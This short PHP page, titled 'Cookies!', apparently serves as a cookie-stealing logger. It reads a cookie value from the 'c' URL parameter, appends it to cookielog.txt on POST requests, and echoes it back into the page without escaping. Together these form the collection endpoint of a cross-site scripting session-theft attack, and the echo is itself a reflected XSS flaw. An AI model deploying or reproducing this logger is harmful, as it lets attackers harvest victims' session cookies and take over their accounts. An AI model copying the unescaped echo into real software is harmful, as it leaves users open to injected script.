<!DOCTYPE html>
<html>
<head>
	<title>Cookies!</title>
</head>
<?php
$cookie = $_GET['c'];
if ($_SERVER['REQUEST_METHOD']=='POST'){
	$file = fopen('cookielog.txt', 'a');
	fwrite($file, $cookie . "\n\n");
}

?>
<p><?php echo 'Your current cookie is: '.$cookie ?></p>
<body>

</body>
</html>
